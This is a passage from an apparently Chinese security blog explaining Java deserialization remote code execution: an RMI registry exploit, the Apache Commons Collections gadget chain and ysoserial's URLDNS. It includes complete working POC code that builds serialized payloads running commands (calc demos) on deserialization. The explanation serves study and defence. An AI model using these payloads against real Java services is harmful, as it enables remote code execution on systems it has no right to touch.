class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIexploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 远程 RMI Server 的地址</span></span><br><span class="line">        String ip = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1099</span>;</span><br><span class="line">        <span class="comment">// 要执行的命令</span></span><br><span class="line">        String command = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">final</span> String ANN_INV_HANDLER_CLASS = <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 构造 transformers</span></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123; command &#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line">        <span class="comment">// 构造 chainedtransformer</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// TiedMapEntry 类中调用 Map 类的 get 方法</span></span><br><span class="line">        <span class="comment">// LazyMap 的 get 方法调用 transform</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">		</span><br><span class="line">        <span class="comment">// BadAttributeValueExpException 重写 readObject 方法，调用输入流的 toString 方法</span></span><br><span class="line">        <span class="comment">// TiremapEntry 的 getValue 方法调用 LazyMap 的 get 方法</span></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valfield = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置 TiedMapEntry</span></span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(badAttributeValueExpException, entry);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 把 BadAttributeValueExpException 对象封装在 Map 中</span></span><br><span class="line">        String name = <span class="string">&quot;pwned&quot;</span> + System.nanoTime();</span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">        map.put(name, badAttributeValueExpException);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获得 AnnotationInvocationHandler 的构造函数</span></span><br><span class="line">        Constructor cl = Class.forName(ANN_INV_HANDLER_CLASS).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        cl.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 把 Map 封装到 AnnotationInvocationHandler 中，转换为 Remote 类型</span></span><br><span class="line">        <span class="comment">// 实例化一个代理</span></span><br><span class="line">        InvocationHandler hl = (InvocationHandler)cl.newInstance(Override.class, map);</span><br><span class="line">        Object object = Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Remote.class&#125;, hl);</span><br><span class="line">        Remote remote = Remote.class.cast(object);</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(ip, port);</span><br><span class="line">        registry.bind(name, remote);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器</p>
<img src="https://i.loli.net/2021/09/16/18OfJbtvEo64U3F.jpg" >


<h3 id="Apache-CommonsCollections"><a href="#Apache-CommonsCollections" class="headerlink" title="Apache CommonsCollections"></a>Apache CommonsCollections</h3><blockquote>
<p>利用 ChainedTransformer 构造恶意代码执行链，反序列化时触发其 transform 方法通过反射调用构造好的恶意代码<br>TransformedMap 修改 key 就会触发调用相应的 transformer.transform<br>动态代理 AnnotationInvocationHandler 在反序列化时对其变量进行设置操作<br>ChainedTransformer 和 AnnotationInvocationHandler 可作为其他 gadget 的“后半”部分</p>
</blockquote>
<p>反射机制：在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性。</p>
<p>漏洞成因：InvokerTransformer 类实现的 Transformer 接口，可以通过 Java 反射机制来调用任意函数。</p>
<p>远程代码执行：Client 构造恶意序列化对象，Server 反序列化触发 <code>readObject</code> 方法，触发构造好的 Transformer 序列，实现代码执行。</p>
<img src="https://i.loli.net/2021/09/16/43poxMzsqw78rDm.png" >


<p>Map 类是存储键值对的数据结构，Apache Commons Collections中实现了类 TransformedMap，用来对 Map 进行某种变换，只要调用 <code>decorate()</code> 函数，传入 key 和 value 的变换函数 Transformer，即可从任意 Map 对象生成相应的 TransformedMap。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">super</span>(map);</span><br><span class="line">	<span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">	<span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Transformer 是一个接口，其中定义的 <code>transform()</code> 函数用来将一个对象转换成另一个对象。当 Map 中的任意项的 key 或者 value 被修改，相应的 Transformer 就会被调用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Apache Commons Collections 中已经实现了一些常见的 Transformer，其中的 InvokerTransformer 可以通过调用 Java 的反射机制来调用任意函数：</p>
<ul>
<li>可控参数 <code>iMethodName</code>、<code>iParamTypes</code>、<code>iArgs</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iMethodName = methodName; <span class="comment">// 方法名称</span></span><br><span class="line">        iParamTypes = paramTypes; <span class="comment">// 参数类型</span></span><br><span class="line">        iArgs = args;			  <span class="comment">// 参数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ConstantTransformer 的 <code>transform()</code> 方法，返回 iConstant 属性</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ChainedTransformer 接受 Transformer 数组，<code>transform</code> 方法循环调用 Transformer 的 transform 方法，并使用前一个 object 作为参数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">		object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞利用需要触发 ChainedTransformer 对象的 <code>transform()</code> 函数，而 TransformedMap 的 <code>checkSetValue</code> 函数中就调用了 <code>transform</code> 方法，那么就要通过构造一个 Map 和一个能执行代码的 ChainedTransformer 以此生成 TransformedMap，然后修改 Map 触发 Transformer 调用。</p>
<p>TransformedMap 中有三个方法调用了 <code>transform()</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">transformKey</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (keyTransformer == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> object;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> keyTransformer.transform(object);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">transformValue</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (valueTransformer == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> object;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>动态代理（Dynamic Proxy） AnnotationInvocationHandler 类的 <code>memberValues</code> 是 Map 类型。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        <span class="keyword">this</span>.type = type;</span><br><span class="line">        <span class="keyword">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>AnnotationInvocationHandler 的 <code>readObject</code> 函数对 <code>memberValues</code> 的每一项调用 <code>setValue</code> 函数，而该函数会触发 TransformedMap 的 <code>checkSetValue</code> 方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                <span class="comment">// 触发 Transformer</span></span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>序列化对象触发代码执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject -&gt; Map.setValue -&gt; TransformedMap.checkSetValue -&gt; ChainedTransformer.transform -&gt; InvokeTransformer.transform -&gt; 代码执行</span><br></pre></td></tr></table></figure>

<p>POC 示例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">Reverse_Payload</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 构造 ChainedTransformer</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;open /Applications/Calculator.app&quot;</span> &#125;) &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">		</span><br><span class="line">        <span class="comment">// 构造 Map</span></span><br><span class="line">        Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innermap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 构造 TransformedMap</span></span><br><span class="line">        Map outmap = TransformedMap.decorate(innermap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 通过反射获得 AnnotationInvocationHandler 类对象</span></span><br><span class="line">        Class cls = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过反射获得 cls 的构造函数</span></span><br><span class="line">        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置 Accessible 为 true</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//通过 newInstance() 方法实例化对象</span></span><br><span class="line">        Object instance = ctor.newInstance(Retention.class, outmap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GeneratePayload(Reverse_Payload(), <span class="string">&quot;obj&quot;</span>);</span><br><span class="line">        payloadTest(<span class="string">&quot;obj&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GeneratePayload</span><span class="params">(Object instance, String file)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 将构造好的 payload 序列化后写入文件中</span></span><br><span class="line">        File f = <span class="keyword">new</span> File(file);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">payloadTest</span><span class="params">(String file)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 读取写入的 payload 并进行反序列化</span></span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(file));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h1><div class="note primary flat"><p>建议將 <a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">frohoff/ysoserial</a> 克隆下来本地调试，这里也只是翻查了一下利用链而已。</p>
</div>

<p>Java 反序列化 RCE 三要素：readobject 利用点、利用链、RCE 触发点</p>
<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><blockquote>
<p>URL 类的对象在比较时会进行 DNS 查询，HashMap 反序列化时会对 key 进行哈希和比较<br>将 URL 类对象作为 HashMap 的 key，同时将其 url 设置为可以查询 DNSLOG 地址，将 HashMap 发送到目标服务器，当服务器反序列该数据时将触发 DNS 查询。</p>
</blockquote>
<p>不依赖任何第三方库，可以用于确认 <code>readObject</code> 反序列化利用点存在</p>
<p>URL 类在比较时（<code>equals</code>、<code>hashCode</code>）会进行 DNS 查询，当两个主机名解析到同一个 ip 时认为它们相等。</p>
<p>利用链</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() <span class="comment"># k-v 结构</span></span><br><span class="line">  HashMap.putVal()   <span class="comment"># java.util.HashMap#readObject 反序列化中调用，参数为 hash(key)</span></span><br><span class="line">    HashMap.hash()   <span class="comment"># 计算 key 的哈希值，调用 java.net.URL#hashCode</span></span><br><span class="line">      URL.hashCode() <span class="comment"># 当 hashCode 为 -1 时，调用 java.net.URLStreamHandler#hashCode，内部再调用 getHostAddress </span></span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/09/16/TkyD5gURHJzx4lG.png" >

<p>POC 示例</p>
<ul>
<li>将 URL 对象作为 HashMap 的 key，反序列化时触发 DNS 查询</li>
<li>URL 类会缓存 <code>hashCode</code> 的执行结果，存储在一个非 transient 的实例变量中，序列化时写入<ul>
<li>因此在把 URL 添加到 HashMap 前要重置缓存值（利用反射）</li>
</ul>
</li>
</ul>
